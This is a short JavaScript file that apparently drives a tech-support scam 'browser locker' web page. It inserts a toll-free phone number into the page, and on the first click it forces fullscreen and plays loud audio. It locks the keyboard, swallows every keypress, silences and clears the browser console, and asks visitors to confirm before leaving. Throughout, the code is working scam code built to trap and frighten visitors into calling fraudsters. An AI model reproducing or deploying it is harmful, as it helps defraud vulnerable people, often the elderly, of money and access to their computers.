var nr = '+1-833-846-1214';

// disable excessive audio, fullscreen and other annoying features
var devmode = false;

var audio;

addEventListener('DOMContentLoaded', function() {
    audio = document.getElementById('audio');
    audio.volume = 1;

    addPhone();

    document.addEventListener('click', function() {
        init();
    });

    if (!devmode) {
        navigator.keyboard.lock();
        document.onkeydown = function() {
            return false;
        };
    }
});

function addPhone() {
    var nodes = document.getElementsByClassName('tel');
    for (var i = 0; i < nodes.length; i++) {
        nodes[i].textContent = nr;
    }
}

function removeBlur() {
    var nodes = document.getElementsByClassName('blur');
    for (var i = 0; i < nodes.length; i++) {
        nodes[i].style.filter = 'unset';
    }
}

function removeElements() {
    var nodes = [
        document.getElementById('cookie'),
        document.getElementById('fb-permission'),
        document.getElementById('leave-notification')
    ];

    for (var i = 0; i < nodes.length; i++) {
        if (nodes[i] && nodes[i].parentNode) {
            nodes[i].parentNode.removeChild(nodes[i]);
        }
    }
}

function openFullscreen() {
    if (devmode) return;

    if (document.documentElement.requestFullscreen) {
      document.documentElement.requestFullscreen();
    } else if (document.documentElement.webkitRequestFullscreen) { /* Safari */
      document.documentElement.webkitRequestFullscreen();
    } else if (document.documentElement.msRequestFullscreen) { /* IE11 */
      document.documentElement.msRequestFullscreen();
    }
  }

function start() {

    removeElements();
    removeBlur();

    var top = document.getElementById('top-banner');
    top.style = 'block';

    openFullscreen();
}

function init() {
    start();

    if (devmode) return;

    if (audio) {
        audio.volume = 1;
        if (audio.paused) {
            audio.play();
        }
    }
}

function log() {}

if (!devmode) {
    console.log = log;
    console.error = log;
    console.debug = log;
    console.warn = log;
    console.clear();
    window.onbeforeunload = function(){
        return 'Are you sure you want to leave?';
    };
}
